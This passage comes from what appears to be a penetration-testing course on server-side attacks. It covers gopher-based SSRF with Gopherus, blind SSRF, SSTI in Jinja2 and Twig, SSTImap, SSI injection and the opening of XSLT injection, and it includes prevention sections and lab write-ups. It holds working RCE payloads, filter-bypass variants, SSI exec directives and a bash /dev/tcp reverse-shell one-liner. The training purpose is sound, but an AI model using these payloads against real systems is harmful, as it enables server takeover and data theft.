**Beyond HTTP:** gopher can talk to many internal services, not just web servers. If your port scan revealed, say, TCP `25` (SMTP), you can use gopher to speak SMTP and send mail from the internal server. Hand-crafting these byte streams is tedious and error-prone, which is exactly why the next section uses a tool to generate them.

---

## 2.10 Automating gopher with Gopherus

Building correct gopher URLs by hand is slow and fragile — one wrong byte and the target service rejects the whole stream. **Gopherus** automates this for a range of common services, asking you for the relevant details and then printing a ready-to-use gopher URL. It requires a valid **Python 2** installation (it is an older tool). Gopherus supports MySQL, PostgreSQL, FastCGI, Redis, SMTP, Zabbix, and several memcache variants (`pymemcache`, `rbmemcache`, `phpmemcache`, `dmpmemcache`), which together cover a lot of internal attack surface.

**Step 1 — Run Gopherus and see the supported exploits:**

```bash
$ python2.7 gopherus.py --help

usage: gopherus.py [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
```

**Step 2 — Generate a gopher URL for a service**, e.g. SMTP. The tool prompts for the email details and prints the finished URL:

```bash
$ python2.7 gopherus.py --exploit smtp

Give Details to send mail:
Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail:
gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.
```

**Step 3 — Use that URL in your SSRF.** Remember the double-encoding rule from section 2.9: when you drop this gopher URL into the outer POST parameter, URL-encode it once more so it survives the outer request intact.

### Troubleshooting gopher Payloads

Gopher is the most error-prone SSRF technique, almost always because of encoding. If your payload isn''t working, walk through this checklist before assuming the target is patched:

- **"Malformed URL" error** → you forgot the **second** round of URL-encoding. The gopher URL must be encoded once to build it, then encoded *again* because it rides inside an already-encoded parameter. Every `%` from the first pass should appear as `%25` in the final request.
- **Wrong `Content-Length`** → for an HTTP POST, the `Content-Length` header must exactly match the byte length of the body. If it''s off, the internal server waits for more data or truncates the body. Recount after any change to the body.
- **Missing blank line before the body** → an HTTP request needs a blank line (`%0D%0A%0D%0A`) between the headers and the body. Leaving it out means the body is treated as another header.
- **Line endings** → HTTP wants CRLF (`%0D%0A`), not just LF (`%0A`). Some services tolerate LF, but web servers often don''t.
- **Port mismatch** → the port in `gopher://host:PORT/` must match the service you''re targeting (80 for HTTP, 25 for SMTP, 3306 for MySQL, 6379 for Redis, etc.).

When in doubt, let **Gopherus** generate the payload for a supported service rather than hand-crafting it — it handles the inner encoding correctly, leaving you to apply only the outer encoding.

---

## 2.11 Exploiting Blind SSRF

In many real engagements the fetched response is not shown back to you — this is **blind SSRF**. Because every technique in sections 2.6–2.10 relies on reading the response, they are largely unavailable, so the impact is significantly lower. You still confirm it the same way (an out-of-band callback to your listener works), but when you point the app at itself, the response does **not** contain the fetched HTML; instead you get a generic message like "date unavailable." That generic message is the hallmark of blind SSRF. The good news is that blind SSRF is not useless: as long as the application''s response *differs* between success and failure, you can still infer information.

**Step 1 — Confirm blind SSRF** with a listener callback:

```bash
$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

The callback arrives (SSRF works), but pointing the app at itself only returns "date unavailable" — the fetched content is hidden, so this is blind.

**Step 2 — Enumerate open vs closed ports from differing error messages.** In the sample:

- **Closed** port → `Something went wrong!`
- **Open** port that returns a valid HTTP response → a *different* error message.

By watching which message comes back, you can still perform a restricted internal port scan.

**Limitation — non-HTTP services may be invisible.** If a service does not reply with a valid HTTP response (for example, a raw **MySQL** service on `3306`), the application may catch the unexpected error in a way that looks identical to a closed port, so you cannot reliably detect it. How much you can enumerate depends entirely on how the app handles unexpected errors.

**Step 3 — Detect existing vs non-existing files.** Even though you cannot read file contents blindly, the error message often differs between a file that **exists** and one that does **not**. By watching that difference you can enumerate which files are present on the filesystem — valuable for mapping the system and planning later attacks.

**The bottom line on blind SSRF:** you cannot exfiltrate data directly, but you can enumerate open ports and existing files, which reveals the internal architecture. And even when open and closed ports return *identical* messages, you can still *interact* with internal services blindly — meaning you can fire known exploit payloads at internal web apps by guessing common endpoints and payloads, even without seeing the result.

**Timing as a side channel.** When even the error messages are identical for open and closed ports, response *timing* can sometimes still leak information. An open port that accepts the connection and then hangs may make the server respond more slowly than a closed port that is rejected instantly (or vice versa, depending on timeouts). By measuring how long the application takes to respond for different ports, you can occasionally infer open versus closed even with no textual difference. This is slower and noisier than content-based inference, so use it only when nothing else distinguishes the responses.

---

## 2.12 Preventing SSRF

SSRF defenses operate at two layers, and a robust posture uses both. At the **application layer**, if the app must fetch data from a remote host based on user input, the remote origin should be checked against a **whitelist** of explicitly allowed destinations — never a blacklist, which attackers routinely bypass. A whitelist stops the attacker from coercing the server into requests against arbitrary internal origins. The **URL scheme/protocol** must likewise be restricted: hardcode `http`/`https`, or check against a whitelist, so attackers cannot switch to `file://` or `gopher://`. As with every user input, thorough **sanitization and validation** help prevent unexpected behavior that leads to SSRF.

At the **network layer**, appropriately restrictive **firewall rules** can drop outgoing requests to unexpected or sensitive internal systems, neutralizing many SSRF payloads even if the app is vulnerable. **Network segmentation** further limits the blast radius by ensuring that even a successful SSRF cannot reach the most sensitive internal systems.

Key measures at a glance:

- **Whitelist** allowed remote origins (allowlist, not denylist).
- **Restrict the URL scheme** to `http`/`https`; hardcode where possible.
- **Sanitize and validate** all user-supplied URLs and hostnames.
- **Firewall** outbound requests to unexpected or internal destinations.
- **Segment** the network so internal systems aren''t reachable from the web tier.

**Reference:** OWASP SSRF Prevention Cheat Sheet.

---

### Documentation Example (CTF-style write-up)

> **Finding:** SSRF in the `dateserver` parameter → internal port scan, restricted-endpoint access, LFI, and authenticated admin access via gopher.
>
> **Reproduction:**
> ```bash
> # 1. Confirm (callback received on listener)
> $ nc -lnvp 8000
> # -> GET /ssrf HTTP/1.1 from 172.17.0.2
>
> # 2. Non-blind check — app points at itself returns its own HTML
> #    dateserver=http://127.0.0.1/index.php
>
> # 3. Internal port scan
> $ seq 1 10000 > ports.txt
> $ ffuf -w ports.txt -u http://172.17.0.2/index.php -X POST \
>   -H "Content-Type: application/x-www-form-urlencoded" \
>   -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
> # -> 80, 3306 open
>
> # 4. Restricted endpoint discovery through SSRF
> #    dateserver=http://dateserver.htb/admin.php  -> admin panel reachable
>
> # 5. LFI
> #    dateserver=file:///etc/passwd  -> dumps /etc/passwd
>
> # 6. gopher POST to bypass the admin login (password "admin")
> ```
>
> **Evidence / Notes:** Non-blind SSRF. Reached the firewalled `dateserver.htb`, enumerated internal services (web + MySQL), discovered `admin.php`, read local files via `file://`, and bypassed the admin login with a hand-crafted `gopher://` POST. Impact: internal network access + sensitive file disclosure + admin takeover. **Severity: Critical.**
>
> **Screenshot placeholder:** `[ Attach listener callback + ffuf open ports + /etc/passwd + admin dashboard ]`

---

# 3. Server-Side Template Injection (SSTI)

---

## 3.1 Template Engines Explained

A **template engine** is software that combines a pre-defined template with dynamically generated data to produce a final output — most often an HTML page, but it could be any text. Web applications lean on template engines heavily because they make dynamic responses clean and maintainable. The classic example is a site where every page shares the same header and footer: rather than copy-pasting that markup into dozens of files, you define it once in a template and let the engine insert the page-specific content in the middle. This avoids duplication, reduces complexity, and makes the codebase far easier to maintain. Popular, widely deployed engines include **Jinja** (used across the Python ecosystem) and **Twig** (used in the PHP ecosystem), and these are the two this module exploits.

Understanding how a template engine normally works is the foundation for understanding how SSTI breaks it — so the next subsection walks through the mechanics of templating and rendering using Jinja''s syntax.

---

## 3.2 Templating Syntax and Rendering

Template engines typically take **two inputs**: a **template** and a set of **values**. The template can be supplied as a string or as a file, and it contains pre-defined placeholders marking where dynamic content should go. The values are supplied as **key-value pairs**, so the engine knows which value belongs in which placeholder. The act of combining the template with the values to produce the final string is called **rendering**. The exact placeholder syntax depends on the engine; these notes use Jinja syntax throughout this part.

**A single-variable template** (Jinja). The `{{ name }}` is a placeholder for a variable called `name`:

```jinja2
Hello {{ name }}!
```

When this template is rendered with the value `name="vautia"`, the engine substitutes the variable and produces:

```txt
Hello vautia!
```

The engine simply replaced the placeholder with the supplied value — nothing more.

**A template with logic.** Modern engines support programming constructs like loops and conditionals. This template loops over every element in a `names` variable:

```jinja2
{% for name in names %}
Hello {{ name }}!
{% endfor %}
```

Rendered with a list `names=["vautia", "21y4d", "Pedant"]`, the engine iterates and produces:

```txt
Hello vautia!
Hello 21y4d!
Hello Pedant!
```

The key takeaway is that template engines can *execute* logic found inside the template — loops, conditionals, and more. That execution capability is harmless when the template is trusted, but it becomes dangerous the moment an attacker can influence the template itself.

---

## 3.3 What SSTI Is

Server-Side Template Injection occurs when an attacker can inject templating code into a template that the server later renders. Because template engines **run the code inside templates**, a malicious injection can be executed by the server during rendering — and that can hand the attacker complete control of the server. The single most important concept to internalize here is the difference between a **value** and the **template string**. When user input is passed to the engine as a *value*, it is safe: the engine inserts it into the placeholder but never executes it as code. SSTI arises specifically when the attacker can influence the *template string* itself, because the engine runs whatever code the template contains.

In other words, correct templating always keeps user input on the *value* side of the rendering function and never lets it become part of the template. SSTI is what happens when that boundary is crossed — when user input is concatenated into the template before rendering, so the engine treats attacker input as code to execute rather than data to display.

**A concrete picture of the bug.** Imagine a Flask app that greets users. The *safe* way is `render_template_string("Hello {{ name }}!", name=user_input)` — here `user_input` is a value, so `{{7*7}}` typed by the user is just printed literally as the text `{{7*7}}`. The *vulnerable* way is `render_template_string("Hello " + user_input + "!")` — here `user_input` is glued into the template string, so a user who submits `{{7*7}}` causes the engine to evaluate it and render `Hello 49!`. That one-character difference in how the developer wires up the call is the entire vulnerability. This is why, when you see your input mathematically evaluated (`{{7*7}}` → `49`), you know you''re on the dangerous side of that boundary.

---

## 3.4 How SSTI Creeps Into Code

If templating is implemented correctly, user input is always supplied to the rendering function as values and never embedded into the template string — so no SSTI is possible. The vulnerability appears when a developer, often inadvertently, lets user input become part of the template. There are a few recurring patterns that cause this, and recognizing them helps you both find SSTI as an attacker and avoid it as a developer.

- **Input concatenated into the template before rendering.** The classic mistake: the developer builds the template string by gluing user input into it, *then* calls the rendering function on the combined string. Now the attacker''s input is part of the template and gets executed.
- **Double rendering.** If the application renders the same template **twice**, user input that was safely inserted as a value during the first render becomes part of the template *string* going into the second render — and is executed on that second pass.
- **User-editable or user-submitted templates.** If the application''s whole purpose is to let users modify existing templates or upload new ones, that is an obvious and direct SSTI vector, because the user controls the template by design. Such features demand heavy sandboxing.

---

## 3.5 Confirming SSTI

Confirming SSTI follows the same logic as confirming any injection vulnerability, such as SQL injection: you inject characters that carry special meaning to the engine and watch how the application reacts. The most effective first probe is a test string that packs together **all** the special characters used by popular template engines, because it is almost guaranteed to violate template syntax and trigger an error if the parameter is vulnerable. This is directly analogous to injecting a single quote (`''`) to break a SQL query and provoke a database error.

**Step 1 — Inject the universal SSTI probe string:**

```txt
${{<%[%''"}}%\.
```

If the application responds with an **error** (for example, an `Internal Server Error`), that does not *prove* SSTI on its own — but it strongly suggests the parameter processes template syntax and is worth investigating further.

**Walking through the sample app:** you submit a name, which is reflected back on a results page alongside your IP and the current time (a normal, benign render). When you then submit the probe string `${{<%[%''"}}%\.` as the name, the application throws an `Internal Server Error`. That error raises your suspicion that the name parameter is injected into a template before rendering — time to fingerprint the engine.

---

## 3.6 Identifying the Template Engine

To exploit SSTI you must know **which** engine is in use, because payloads differ between engines — each has slightly different syntax and different functions available for exploitation. You identify the engine by exploiting small behavioral differences, sending simple math payloads and following a decision tree based on which ones evaluate. The standard approach starts with `${7*7}` and branches depending on whether it executes (follow the "success" path) or not (follow the "failure" path) until you arrive at a specific engine.

**Step 1 — Inject `${7*7}`.** If the result is `49`, the engine uses `${...}` syntax; if it is *not* executed (you see `${7*7}` literally or an unrelated result), move on.

**Step 2 — Inject `{{7*7}}`.** In the sample app, the first payload did *not* execute, so we try this one. If the result is `49`, the engine uses `{{...}}` syntax — this narrows it to the Jinja/Twig family.

**Step 3 — Disambiguate with `{{7*''7''}}`.** This payload multiplies a number by a *string*, and the two engines handle it differently:

| Payload | Jinja result | Twig result |
|---------|--------------|-------------|
| `{{7*7}}` | `49` | `49` |
| `{{7*''7''}}` | `7777777` (string repetition) | `49` (numeric multiplication) |

So if `{{7*''7''}}` returns `7777777`, you''re dealing with **Jinja**; if it returns `49`, you''re dealing with **Twig**. With the engine identified, you can select the correct exploitation payloads in the next subsections.

**Why these specific payloads work as a fingerprint.** `${...}` and `{{...}}` are different placeholder syntaxes used by different engine families, so which one evaluates immediately tells you something about the engine. The `{{7*''7''}}` test is cleverer: it relies on how each language handles multiplying a number by a *string*. Python (Jinja) interprets `7 * ''7''` as "repeat the string `''7''` seven times," giving `7777777`. PHP (Twig) coerces the string `''7''` to the number `7` and multiplies, giving `49`. By exploiting these small, language-level behavioral differences, you can distinguish engines that otherwise share the same `{{ }}` syntax. A broader decision tree (used by tools and cheat sheets) chains several such probes to separate many engines — Jinja, Twig, Freemarker, Velocity, Smarty, and more — but `${7*7}` → `{{7*7}}` → `{{7*''7''}}` is enough to reach the two engines this module covers.

---

## 3.7 Exploiting SSTI — Jinja2

Jinja is a template engine commonly used in Python web frameworks such as **Flask** and **Django**; this section assumes a **Flask** application, so payloads in other frameworks may differ slightly. We assume SSTI has already been confirmed and the engine identified as Jinja. A powerful property of Jinja SSTI is that your payloads can freely use any library the Python application has already imported (directly or indirectly), and you can often reach even more by importing additional libraries at runtime. The typical escalation path moves from information disclosure, to local file reading, to full remote code execution.

**Step 1 — Information disclosure: dump the app configuration** (often includes secret keys you can abuse for further attacks):

```jinja2
{{ config.items() }}
```

**Step 2 — Dump all built-in functions**, which you''ll use as a launch pad for file reads and RCE:

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

This walks from a template object (`self`) up through Python''s object internals to reach the dictionary of built-in functions. Nothing is executed yet — you''re just revealing what''s available.

**Step 3 — Local File Inclusion** using Python''s built-in `open`. You can''t call `open` directly, so you reach it through the `__builtins__` dictionary from the previous step:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

This opens `/etc/passwd` and reads it, returning the contents in the response. Swap the path for source code or config files.

**Step 4 — Remote Code Execution** using the `os` library. If the app hasn''t already imported `os`, you import it at runtime via the built-in `__import__`, then call `popen` to run a command and read its output:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}
```

Replace `id` with any command you want to run. This yields full command execution as the web application''s user — the highest-impact outcome for SSTI.

### Alternative Jinja Payloads (good to know)

The `self.__init__.__globals__.__builtins__` chain is the classic path, but Jinja exposes several other routes to the same built-ins, and knowing more than one is useful when a WAF blocks a particular keyword like `__globals__` or `popen`. The payloads below all reach RCE through slightly different object chains; try another when your first is filtered.

```jinja2
{# Via the cycler object #}
{{ cycler.__init__.__globals__.os.popen(''id'').read() }}

{# Via the lipsum helper (reaches os directly) #}
{{ lipsum.__globals__.os.popen(''id'').read() }}

{# Via the request object (Flask) #}
{{ request.application.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}

{# Classic subclass walk to subprocess.Popen (index varies per app) #}
{{ ''''.__class__.__mro__[1].__subclasses__() }}
```

**Reverse shell idea:** once you confirm RCE with `id`, swap the command for a reverse shell one-liner, for example
`bash -c ''bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1''`, and catch it with `nc -lnvp 4444` on your attack host.

---

## 3.8 Exploiting SSTI — Twig

Twig is a template engine for the **PHP** programming language. The exploitation philosophy is identical to Jinja — escalate from information disclosure to LFI to RCE — only the syntax changes, which reinforces an important lesson: once you understand *how* SSTI works, attacking an unfamiliar engine is mostly a matter of learning its syntax and features from its documentation. Twig exposes noticeably less internal information than Jinja, but you can still reach file reading and command execution.

**Step 1 — Information disclosure** using the `_self` keyword (returns limited info about the current template):

```twig
{{ _self }}
```

Compared to Jinja''s rich `config` and `__globals__` dumps, Twig''s `_self` reveals relatively little — but it confirms execution and the engine.

**Step 2 — Local File Inclusion.** Twig''s own internal functions can''t directly read arbitrary files. However, the PHP framework **Symfony** defines extra Twig filters, one of which — `file_excerpt` — can read local files:

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

The `file_excerpt(1,-1)` filter reads the file from line 1 to the last line, returning its contents. (This works when the app runs on Symfony, which adds these filters.)

**Step 3 — Remote Code Execution** using a PHP built-in such as `system`. You pass the command as an argument by abusing Twig''s `filter` function:

```twig
{{ [''id''] | filter(''system'') }}
```

Here `[''id'']` is an array containing the command, and `filter(''system'')` applies PHP''s `system` function to it — executing `id` on the server. Replace `id` with any command for full RCE.

### Alternative Twig Payloads (good to know)

As with Jinja, it helps to know more than one Twig RCE route in case a filter blocks `filter` or `system`. The payloads below reach command execution through different Twig functions; `map` and `reduce` behave similarly to `filter` in accepting a callable, and older Twig versions exposed `_self.env.registerUndefinedFilterCallback`.

```twig
{# filter — the standard route #}
{{ [''id''] | filter(''system'') }}

{# map — apply a callable across an array #}
{{ [''id''] | map(''system'') | join }}

{# reduce — fold with a callable #}
{{ [''id'','''']|reduce(''system'') }}

{# older Twig: register system as an undefined-filter handler then trigger it #}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

**Reverse shell idea:** confirm with `id`, then swap in a reverse-shell command (`bash -c ''bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1''`) and catch it with `nc -lnvp 4444`.

**Further remarks:** The syntax differs between engines, but the general idea behind SSTI exploitation is the same everywhere. Exploiting an unfamiliar engine is usually just a matter of reading its documentation to learn its syntax and supported features. To shortcut this, use a payload collection like the **PayloadsAllTheThings SSTI cheat sheet**, which bundles ready payloads for many popular engines.

---

## 3.9 Tools of the Trade — SSTImap

Manual exploitation builds deep understanding, but automation saves time on real engagements. The most popular classic tool, `tplmap`, is **no longer maintained** and runs on the deprecated Python 2, so the modern choice is **SSTImap**. SSTImap automatically detects SSTI, identifies the template engine, and reports the exploitation **capabilities** it found — shell command execution, bind/reverse shells, file read, file write, and code evaluation. You point it at a URL with an injectable parameter and it handles detection and exploitation for you, including downloading files, running single commands, or dropping you into an interactive OS shell.

**Step 1 — Install SSTImap:**

```bash
$ git clone https://github.com/vladko312/SSTImap
$ cd SSTImap
$ pip3 install -r requirements.txt
$ python3 sstimap.py
```

Running it with no target prints the banner, version, and loaded plugins, then reminds you it needs a target URL.

**Step 2 — Auto-detect SSTI and the engine** by supplying the target URL and injectable parameter:

```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

Example output identifies the injection point and capabilities:

```
[+] SSTImap identified the following injection point:
  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

**Step 3 — Download a remote file** to your local machine with `-D` (source path, then destination path):

```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D ''/etc/passwd'' ''./passwd''
# [+] File downloaded correctly
```

**Step 4 — Execute a single command** with `-S`:

```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Step 5 — Get an interactive OS shell** with `--os-shell`:

```bash
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux $ whoami
www-data
```

---

## 3.10 Preventing SSTI

The core rule for preventing SSTI is simple to state and critical to follow: **user input must never be passed to the template engine''s rendering function as part of the template parameter** — it should only ever be supplied as values. Achieving this means carefully auditing every code path to ensure user input is never concatenated into a template before the rendering call. This single discipline eliminates the vast majority of SSTI.

Some applications genuinely need to let users modify existing templates or upload new ones for business reasons. In those cases, strong hardening is essential to prevent server takeover. One approach is to harden the engine by **removing dangerous functions** that enable RCE from the execution environment, so attackers can''t use them in payloads — but this is **prone to bypasses**, as attackers keep finding alternative functions. A stronger approach is to **fully separate the template engine''s execution environment** from the web server, for example by running it inside an isolated **Docker container**, so even a successful injection cannot compromise the host.

Key measures:

- **Never** insert user input into the template parameter; keep it in values.
- Audit all code paths for input concatenated into templates or double-rendered output.
- If users must edit/upload templates, **sandbox** the engine (remove dangerous functions) — but treat this as weak on its own.
- Best practice: run the engine in a **fully isolated environment** (e.g. a separate Docker container) from the web server.

---

### Documentation Example (CTF-style write-up)

> **Finding:** SSTI in the `name` parameter → RCE as `www-data` (Twig engine on PHP/Symfony).
>
> **Reproduction:**
> ```text
> # Confirm
> name = ${{<%[%''"}}%\.        -> Internal Server Error
>
> # Fingerprint
> name = {{7*7}}              -> 49         (engine uses {{ }})
> name = {{7*''7''}}            -> 49         (Twig, not Jinja)
>
> # Information disclosure
> name = {{ _self }}
>
> # LFI (Symfony filter)
> name = {{ "/etc/passwd"|file_excerpt(1,-1) }}
>
> # RCE
> name = {{ [''id''] | filter(''system'') }}    -> uid=33(www-data)
>
> # Automated confirmation
> $ python3 sstimap.py -u "http://172.17.0.2/index.php?name=test" -S id
> ```
>
> **Evidence / Notes:** Reflected `name` input is concatenated into a Twig template before rendering. Confirmed via the universal probe + math fingerprinting, read `/etc/passwd` through Symfony''s `file_excerpt`, and achieved command execution via `filter(''system'')`. SSTImap corroborated the finding and the Twig engine. Impact: full RCE. **Severity: Critical.** Fix: keep user input in template *values*, and isolate the engine in a container.
>
> **Screenshot placeholder:** `[ Attach {{7*7}}=49, {{7*''7''}}=49, and id output ]`

---

# 4. Server-Side Includes (SSI) Injection

---

## 4.1 What SSI Is

**Server-Side Includes (SSI)** is a technology web applications use to create dynamic content on otherwise static HTML pages. It is an older mechanism but still widely supported, including by popular web servers such as **Apache** and **IIS**. A typical use case is including content shared across many pages — headers, footers, navigation bars — so it only needs to be written once. The presence of SSI can often be *inferred* from a page''s file extension: typical SSI extensions are `.shtml`, `.shtm`, and `.stm`. However, this is only a hint: web servers can be configured to process SSI directives in files with *any* extension, so you can never conclusively determine that SSI is in use from the extension alone — you confirm it by testing.

SSI works by embedding special **directives** — which look like HTML comments — inside the HTML. When the web server serves such a page, it processes these directives and replaces them with dynamically generated content before sending the page to the client. That server-side processing is exactly what an attacker aims to abuse.

---

## 4.2 SSI Directives

SSI uses **directives** to add dynamically generated content to a static HTML page. Each directive is built from three components: a **name** (which directive it is), one or more **parameter names**, and one or more **parameter values**. The directives look like HTML comments with a `#` prefix, which means they''re invisible in a normal HTML render but meaningful to an SSI-enabled server. Knowing the common directives is essential, because some are harmless information printers while others — notably `exec` — can run operating-system commands, which is the attacker''s ultimate goal.

**General directive syntax:**

```
<!--#name param1="value1" param2="value2" -->
```

Here are the most common directives, what they do, and how they''re used:

| Directive | Purpose | Example |
|-----------|---------|---------|
| `printenv` | Prints all environment variables. Takes no parameters. | `<!--#printenv -->` |
| `config` | Changes SSI configuration via parameters, e.g. the error message using `errmsg`. | `<!--#config errmsg="Error!" -->` |
| `echo` | Prints the value of any variable named in a `var` parameter (multiple `var`s allowed). | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
| `exec` | **Executes the system command** given in the `cmd` parameter. | `<!--#exec cmd="whoami" -->` |
| `include` | Includes the file named in the `virtual` parameter (web-root files only). | `<!--#include virtual="index.html" -->` |

**Common `echo` variables** worth knowing:

- `DOCUMENT_NAME` — the current file''s name.
- `DOCUMENT_URI` — the current file''s URI.
- `LAST_MODIFIED` — the timestamp of the current file''s last modification.
- `DATE_LOCAL` — the local server time.

The two directives attackers care about most are `printenv` (a safe way to confirm SSI executes) and `exec` (the path to command execution).

**Why `printenv` is the ideal confirmation probe.** It is completely non-destructive — it only reads and prints environment variables, changing nothing on the server — yet it produces an unmistakable, obvious result: a block of `KEY=value` environment data appearing where your input was. That makes it perfect for a safe proof-of-concept you can show stakeholders without risk. By contrast, `exec` actually runs commands, so you save it for *after* you''ve confirmed the vulnerability, and even then you start with a harmless command like `id` or `whoami` before doing anything more impactful.

**A note on `include` vs `exec`.** The `include` directive can only pull in files within the web root, so on its own it''s a limited information-disclosure primitive rather than a command-execution one. It still matters, because a web application might expose `include` while believing `exec` is disabled — so always test both. If `exec` is disabled by server configuration, `include` plus other directives may still leak useful content.

---

## 4.3 How SSI Injection Happens

SSI injection occurs when an attacker can inject SSI directives into a file that the web server subsequently serves — resulting in the server executing the attacker''s injected directives. There are several realistic circumstances where this becomes possible, and all of them share the theme of attacker-controlled content ending up in a file that the server processes for SSI. Recognizing these scenarios helps you spot SSI injection opportunities during an assessment.

- **Vulnerable file upload.** If the application lets you upload a file containing malicious SSI directives into the web root directory (and the server processes that file''s extension for SSI), your directives execute when the file is served.
- **User input written to a served file.** If the application writes user input into a file in the web root — for example, saving a submitted name into a `.shtml` page — and that file is processed for SSI, your injected directives run.

In short, any path by which your input lands inside a file the server treats as SSI-enabled can lead to SSI injection, and from there to data disclosure or command execution.

---

## 4.4 Exploiting SSI Injection

With the theory covered, exploitation is straightforward. In the sample web application, you''re greeted by a simple form asking for your name. When you submit a name, you''re redirected to `/page.shtml`, which displays some general information. The `.shtml` extension is a strong hint that the page supports SSI, and if your name is inserted into the page without sanitization, it may be vulnerable to SSI injection. You confirm this by submitting an SSI directive *as your name* and checking whether the server executes it, then escalate to arbitrary command execution.

**Step 1 — Confirm SSI injection** by supplying a username of `<!--#printenv -->`:

```
<!--#printenv -->
```

If the resulting page prints the server''s **environment variables**, the directive was executed — SSI injection is confirmed. This is a safe, non-destructive proof.

**Step 2 — Escalate to arbitrary command execution** with the `exec` directive. Supply a username of `<!--#exec cmd="id" -->`:

```
<!--#exec cmd="id" -->
```

The server executes `id` and returns the output in the page, proving you can run arbitrary commands. Swap `id` for any command (for example, a reverse-shell one-liner) to take complete control of the web server.

---

## 4.5 Preventing SSI Injection

Improper implementation of SSI can lead to severe consequences, up to and including remote code execution and full takeover of the web server, so applications using SSI must implement proper security measures. As with any injection vulnerability, the primary defense is to **carefully validate and sanitize user input** — this is especially important when user input is used within SSI directives or written to files that the server may process as SSI according to its configuration. Beyond input handling, server configuration plays a big role.

The web server should be configured to **restrict the use of SSI to particular file extensions**, and ideally to particular directories, so that attacker-influenced files aren''t accidentally processed for SSI. Additionally, the **capabilities of specific SSI directives can be limited** to reduce the impact of any injection that does occur — for instance, disabling the `exec` directive entirely if it isn''t actively required removes the direct path to command execution.

Key measures:

- **Validate and sanitize** all user input, especially input used in SSI directives or written to served files.
- **Restrict SSI processing** to specific, intended file extensions and directories.
- **Disable dangerous directives** (notably `exec`) when they aren''t needed.

---

### Documentation Example (CTF-style write-up)

> **Finding:** SSI injection in the name field → remote code execution on the web server.
>
> **Reproduction:**
> ```text
> # 1. Observe page served as /page.shtml  (SSI likely enabled)
>
> # 2. Confirm
> name = <!--#printenv -->        -> environment variables printed on /page.shtml
>
> # 3. Exploit
> name = <!--#exec cmd="id" -->   -> uid/gid of the web server user
> ```
>
> **Evidence / Notes:** The submitted name is written unsanitized into an SSI-processed `.shtml` page. `printenv` confirmed directive execution; `exec cmd="id"` achieved arbitrary command execution. Impact: full server takeover. **Severity: Critical.** Fix: sanitize input, restrict SSI to intended files/dirs, and disable the `exec` directive.
>
> **Screenshot placeholder:** `[ Attach printenv env-var output + exec id result ]`

---

# 5. XSLT Server-Side Injection

---

## 5.1 What XSLT Is

**eXtensible Stylesheet Language Transformation (XSLT)** is a language that enables the transformation of XML documents into other formats. For example, it can select specific nodes from an XML document, restructure the XML, or render it into HTML for display. XSLT is commonly employed in web applications to dynamically generate content from structured XML data — for instance, turning an XML catalog of products or modules into an HTML page. Because XSLT operates on XML, you first need a sample XML document to see how it works.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

XSLT data is structured similarly to XML, but it contains special **XSL elements** inside nodes prefixed with `xsl:`. These elements define *how* the XML data should be transformed. Understanding the core elements is the foundation for understanding XSLT injection, because the attack works by injecting additional XSL elements into the transformation.

---

## 5.2 Core XSL Elements

XSLT provides a set of elements for selecting, looping over, filtering, and outputting XML data. The three you''ll see most are `<xsl:template>`, `<xsl:value-of>`, and `<xsl:for-each>`, with `<xsl:sort>` and `<xsl:if>` adding ordering and conditionals. Learning what each does makes both legitimate XSLT and injected XSLT readable.

| Element | Purpose |
|---------|---------|
| `<xsl:template>` | Declares an XSL template; its `match` attribute is a path in the XML it applies to. |
| `<xsl:value-of>` | Extracts the value of the XML node named in its `select` attribute. |
| `<xsl:for-each>` | Loops over all XML nodes matched by its `select` attribute. |
| `<xsl:sort>` | Sets sort order within a loop (`select` the field, `order` the direction). |
| `<xsl:if>` | Tests a condition on a node, specified in its `test` attribute. |

**A simple XSLT** that lists every fruit and its color:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all the fruits:
        <xsl:for-each select="fruit">
            <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

This template applies to the `<fruits>` node, prints a static string, then loops over each `<fruit>` printing its `<name>` and `<color>`. Combined with the sample XML it produces:

```txt
Here are all the fruits:
    Apple (Red)
